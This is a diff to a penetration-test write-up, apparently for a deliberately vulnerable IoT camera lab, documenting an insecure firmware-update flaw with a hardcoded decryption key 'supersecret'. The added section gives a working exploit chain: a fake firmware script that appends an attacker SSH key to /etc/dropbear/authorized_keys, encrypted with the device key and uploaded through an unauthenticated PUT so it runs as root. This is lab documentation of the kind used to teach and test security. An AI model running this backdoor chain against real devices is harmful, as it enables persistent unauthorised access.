@@ -18,7 +18,7 @@ findings:
   - "IoT1: DONE"
   - "IoT2: PENDING"
   - "IoT3: PENDING"
-  - "IoT4: IN PROGRESS"
+  - "IoT4: DONE"
 ---
 
 # IoT1:2018 Weak, Guessable, Hardcoded Passwords
@@ -75,7 +75,7 @@ To mitigate this risk, it is essential to implement strict validation of firmwar
 
 ## Demonstration
 
-> **IN PROGRESS**
+> **DONE**
 
 We have discovered that the camera listing at the _/cameras_ endpoint includes a button that allows users to initiate firmware updates for their installed cameras.
 
@@ -122,13 +122,15 @@ curl -v "$URL" \
     -H "X-Signature: $SIGNATURE" \
     -o "$FIRMWARE_PATH"
 
-if ! grep -q "$FIRMWARE_SIGNATURE" "$FIRMWARE_PATH"; then
+openssl enc -d -aes-256-cbc -pbkdf2 -in "$FIRMWARE_PATH" -out "/tmp/update.sh" -k 'supersecret'
+
+if ! grep -q "$FIRMWARE_SIGNATURE" "/tmp/update.sh"; then
     echo "Firmware signature verification failed. Update aborted."
     exit 1
 fi
 
-openssl enc -d -aes-256-cbc -in "$FIRMWARE_PATH" -out "/tmp/update.sh" -k 'supersecret'
 chmod +x /tmp/update.sh
+sh /tmp/update.sh
 ```
 
 Despite this, the contents of the firmware files are not directly accessible. However, a vulnerability exists in the API at the _/api/status_ endpoint (see more in [[API/Vulnerabilities#API9:2023 - Improper Inventory Management|Improper Inventory Management]]). This endpoint is susceptible to a Local File Inclusion (LFI) attack, which allows an attacker to view the contents of files stored on the server controller. Access to the firmware data can be achieved either through Local File Inclusion (LFI) or by utilizing the same mechanism employed by the _update-firmware_ process.
@@ -140,7 +142,7 @@ By analyzing the endpoint using the OPTIONS method, we observe that the PUT meth
 With this information, an attacker can create malware that is stored on the API server, which will notify users that a firmware update is available for their cameras. Once users initiate the update, the malicious code will be executed on their devices. The attacker can leverage this to establish persistent connections to the cameras of all clients, for example, by using tools such as *Metasploit*.
 
 ```zsh
-openssl enc -d -aes-256-cbc -in firmware-v1.0.3 -out prueba.sh
+openssl enc -d -aes-256-cbc -pbkdf2 -in firmware-v1.0.3 -out prueba.sh -k 'supersecret'
 ```
 
 ```zsh
@@ -187,3 +189,19 @@ Subsequently, we use our connection to the API and the _/firmware_ endpoint with
 
 > **Cron can be used as if an user is trying to install latest firmware, so attacker can obtain access to the victim's machine.**
 
+
+## End-to-end reproduction and expected result
+
+The payload must carry the signature line as a comment so the decrypt-then-grep check passes, and it must be encrypted with the same recipe the device decrypts with (`-pbkdf2`, key `supersecret`):
+
+```zsh
+cat > malware.sh <<'SH'
+#!/bin/sh
+# FIRMWARE_SIGNATURE: VulnZoo-2025-SECURE
+echo "ssh-rsa AAAA...attacker-key... attacker@evil" >> /etc/dropbear/authorized_keys
+SH
+openssl enc -aes-256-cbc -salt -pbkdf2 -in malware.sh -out firmware-v1.0.4 -k 'supersecret'
+# then upload firmware-v1.0.4 over the /api/status PUT (API9) and have a device run the update
+```
+
+Expected result: the device downloads `firmware-v1.0.4`, decrypts it with `openssl enc -d -aes-256-cbc -pbkdf2 -k 'supersecret'`, the `grep` for the signature line succeeds and `/tmp/update.sh` runs as root, appending the attacker key to `/etc/dropbear/authorized_keys` for a persistent SSH backdoor. Verified device-side on the Pi (OpenSSL 3.0.17): the regenerated `firmware-v1.0.3` and an equivalent `firmware-v1.0.4` both decrypt, pass the signature check and execute. Before this fix the attacker encrypted with `-pbkdf2` while the device decrypted without it, so every update failed with `bad decrypt`.
